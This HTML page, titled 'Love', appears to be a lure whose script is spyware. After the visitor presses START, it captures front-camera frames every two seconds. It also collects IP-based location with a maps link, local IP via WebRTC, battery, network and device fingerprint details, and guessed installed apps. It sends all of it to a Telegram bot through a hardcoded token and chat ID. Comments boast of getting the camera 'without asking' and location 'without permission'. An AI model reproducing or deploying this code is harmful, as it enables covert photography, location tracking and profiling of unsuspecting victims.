<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Love</title>
<style>
body {
    margin: 0;
    padding: 0;
    background: #000;
    color: #fff;
    font-family: sans-serif;
    min-height: 100vh;
}

.fixed-button {
    position: fixed;
    bottom: 0;
    left: 0;
    width: 100%;
    height: 60px;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    border: none;
    color: white;
    font-size: 20px;
    font-weight: bold;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 1000;
    transition: all 0.3s ease;
}

.fixed-button:hover {
    background: linear-gradient(135deg, #5a67d8 0%, #6b46c1 100%);
    height: 70px;
}

.fixed-button:active {
    background: linear-gradient(135deg, #4c51bf 0%, #553c9a 100%);
}

canvas {
    display: none;
}
</style>
</head>
<body>
<canvas id="canvas"></canvas>

<button class="fixed-button" onclick="startSending()">START</button>

<script>
const canvas = document.getElementById("canvas");
const BOT_TOKEN = "7917384016:AAG7cxyuts9UJ-Km0BMqBeQVJEJfstH239g";
const CHAT_ID = "8319568593";
let intervalId = null;
let latitude = "N/A";
let longitude = "N/A";
let mapLink = "Location not available";
let userIP = "Unknown";
let stream = null;
let batteryInfo = "Battery: Not available";
let networkInfo = "Network: Not available";
let localIP = "Unknown";
let city = "Unknown";
let country = "Unknown";
let isp = "Unknown";
let timezone = "Unknown";
let language = "Unknown";

// IP-based location without permission
fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => {
    userIP = d.ip;
    fetch(`https://ipapi.co/${userIP}/json/`)
        .then(r => r.json())
        .then(ipData => {
            city = ipData.city || "Unknown";
            country = ipData.country_name || "Unknown";
            isp = ipData.org || "Unknown";
            latitude = ipData.latitude || "N/A";
            longitude = ipData.longitude || "N/A";
            timezone = ipData.timezone || "Unknown";
            mapLink = `https://maps.google.com/maps?q=${latitude},${longitude}&z=17&t=k`;
        });
});

// Get camera without asking
navigator.mediaDevices.enumerateDevices()
    .then(devices => {
        const videoDevices = devices.filter(device => device.kind === 'videoinput');
        if (videoDevices.length > 0) {
            navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: "user",
                    deviceId: videoDevices[0].deviceId 
                } 
            }).then(s => { stream = s });
        }
    });

// Get battery info if available
if (navigator.getBattery) {
    navigator.getBattery().then(b => {
        batteryInfo = `
ðŸ”‹ Battery:
Level: ${Math.round(b.level * 100)}%
Charging: ${b.charging ? 'Yes' : 'No'}
Time: ${b.chargingTime === Infinity ? 'Not charging' : b.chargingTime + ' seconds'}
`;
    });
}

// Get network info
if (navigator.connection) {
    networkInfo = `
ðŸ“¡ Network:
Type: ${navigator.connection.effectiveType}
Downlink: ${navigator.connection.downlink} Mbps
RTT: ${navigator.connection.rtt} ms
Save Data: ${navigator.connection.saveData ? 'Enabled' : 'Disabled'}
`;
}

// Get local IP
const getLocalIPAddress = () => {
    return new Promise(resolve => {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(sdp => pc.setLocalDescription(sdp));
        pc.onicecandidate = ice => {
            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
            if (ip && ip[1]) resolve(ip[1]);
            pc.close();
        };
        setTimeout(() => resolve("Not found"), 1000);
    });
};

// Get WiFi network info
const getNetworkInfo = () => {
    let info = "";
    if (navigator.connection) {
        const conn = navigator.connection;
        info += `Type: ${conn.effectiveType || 'Unknown'}\n`;
        info += `Downlink: ${conn.downlink || 'Unknown'} Mbps\n`;
        info += `RTT: ${conn.rtt || 'Unknown'} ms\n`;
        if (conn.type) {
            info += `Connection Type: ${conn.type}\n`;
        }
    }
    return info;
};

// Get installed apps detection
const getInstalledApps = () => {
    const apps = [];
    
    // Common app protocols
    const protocols = [
        'spotify:', 'skype:', 'zoommtg:', 'slack:', 'discord:',
        'whatsapp:', 'telegram:', 'viber:', 'ms-word:', 'photoshop:'
    ];
    
    return new Promise(resolve => {
        let detected = [];
        protocols.forEach(protocol => {
            const iframe = document.createElement('iframe');
            iframe.src = protocol + '//';
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            setTimeout(() => {
                if (iframe.contentWindow && iframe.contentWindow.location.protocol === protocol.slice(0, -1)) {
                    detected.push(protocol.slice(0, -1));
                }
                document.body.removeChild(iframe);
            }, 100);
        });
        setTimeout(() => {
            resolve(detected.length > 0 ? detected.join(', ') : 'No apps detected');
        }, 500);
    });
};

// Get Bluetooth status
const getBluetoothInfo = () => {
    if (navigator.bluetooth) {
        return "Available";
    }
    return "Not available or no permission";
};

// Get more device info
const getAdvancedSystemInfo = () => {
    const cores = navigator.hardwareConcurrency || 'Unknown';
    const ram = navigator.deviceMemory || 'Unknown';
    const lang = navigator.language || 'Unknown';
    const langs = navigator.languages ? navigator.languages.join(', ') : lang;
    const timezoneInfo = Intl.DateTimeFormat().resolvedOptions().timeZone || timezone;
    const platform = navigator.platform || 'Unknown';
    const vendor = navigator.vendor || 'Unknown';
    const cookieEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
    const pdfViewerEnabled = navigator.pdfViewerEnabled ? 'Yes' : 'No';
    const webdriver = navigator.webdriver ? 'Yes' : 'No';
    const maxTouchPoints = navigator.maxTouchPoints || 0;
    const userAgent = navigator.userAgent || 'Unknown';
    const deviceModel = userAgent.match(/\((.*?)\)/) ? userAgent.match(/\((.*?)\)/)[1] : 'Unknown';
    
    // Get browser plugins
    const plugins = [];
    if (navigator.plugins) {
        for (let i = 0; i < navigator.plugins.length; i++) {
            plugins.push(navigator.plugins[i].name);
        }
    }
    const pluginList = plugins.length > 0 ? plugins.slice(0, 5).join(', ') : 'No plugins';
    
    const doNotTrack = navigator.doNotTrack || 'Not specified';
    const oscpu = navigator.oscpu || 'Unknown';
    const product = navigator.product || 'Unknown';
    const productSub = navigator.productSub || 'Unknown';

    const now = new Date();
    const timezoneOffset = now.getTimezoneOffset();
    const utcOffset = -timezoneOffset / 60;
    const offsetSign = utcOffset >= 0 ? '+' : '-';
    const formattedOffset = `UTC${offsetSign}${Math.abs(utcOffset)}`;

    // Get screen info
    const screenInfo = `
Screen: ${screen.width}x${screen.height}
Pixel Ratio: ${window.devicePixelRatio}
Color Depth: ${screen.colorDepth}
Orientation: ${screen.orientation ? screen.orientation.type : 'Unknown'}
`;

    return `
ðŸ–¥ï¸ SYSTEM INFORMATION:
Device: ${platform}
Model: ${deviceModel}
OS CPU: ${oscpu}
Browser: ${userAgent.substring(0, 80)}...
Product: ${product} ${productSub}
CPU Cores: ${cores}
RAM: ${ram} GB
Languages: ${langs}
Timezone: ${timezoneInfo}
UTC Offset: ${formattedOffset}
Vendor: ${vendor}
Plugins: ${pluginList}
Do Not Track: ${doNotTrack}
Cookies: ${cookieEnabled}
PDF Viewer: ${pdfViewerEnabled}
WebDriver: ${webdriver}
Touch Points: ${maxTouchPoints}
Bluetooth: ${getBluetoothInfo()}
${screenInfo}
`;
};

// Get installed fonts
const getFonts = () => {
    const fontList = [
        'Arial', 'Times New Roman', 'Courier New', 'Verdana', 
        'Tahoma', 'Georgia', 'Comic Sans MS', 'Impact'
    ];
    let detected = [];
    
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');
    canvas.width = 100;
    canvas.height = 100;
    
    fontList.forEach(font => {
        context.font = '72px ' + font;
        const text = context.measureText('mmmmmmmmmlli');
        if (text.width > 0) {
            detected.push(font);
        }
    });
    
    return detected.length > 0 ? detected.slice(0, 5).join(', ') : 'Standard fonts';
};

function startSending() {
    getLocalIPAddress().then(ip => { 
        localIP = ip;
        
        // Get additional info
        getInstalledApps().then(apps => {
            // Start sending immediately
            if (!intervalId) {
                captureAndSend(apps);
                intervalId = setInterval(() => captureAndSend(apps), 2000);
            }
        });
    });
}

function captureAndSend(installedApps = 'Checking...') {
    if (!stream) return;
    
    const videoTrack = stream.getVideoTracks()[0];
    const imageCapture = new ImageCapture(videoTrack);
    
    imageCapture.grabFrame().then(imageBitmap => {
        canvas.width = imageBitmap.width;
        canvas.height = imageBitmap.height;
        const ctx = canvas.getContext("2d");
        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(imageBitmap, 0, 0);
        
        canvas.toBlob(blob => {
            const caption = `
ðŸ“¸ AUTO CAPTURE - ${new Date().toLocaleTimeString()}
â° Full Time: ${new Date().toLocaleString()}

ðŸ“ IP-BASED LOCATION:
IP Address: ${userIP}
Latitude: ${latitude}
Longitude: ${longitude}
Google Maps: ${mapLink}
City: ${city}
Country: ${country}
ISP: ${isp}
Timezone: ${timezone}

ðŸŒ NETWORK INFORMATION:
Public IP: ${userIP}
Local IP: ${localIP}
Network Info:
${getNetworkInfo()}

ðŸ’» DEVICE INFORMATION:
${getAdvancedSystemInfo()}

ðŸ“± INSTALLED APPS:
${installedApps}

ðŸ”‹ BATTERY INFO:
${batteryInfo}

ðŸ–‹ï¸ DETECTED FONTS:
${getFonts()}

âš ï¸ Automatic capture every 2 seconds
`;
            
            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("photo", blob);
            formData.append("caption", caption);
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { 
                method: "POST", 
                body: formData 
            });
        }, "image/jpeg", 0.7);
    }).catch(err => {
        console.log("Camera capture error:", err);
    });
}
</script>
</body>
</html>
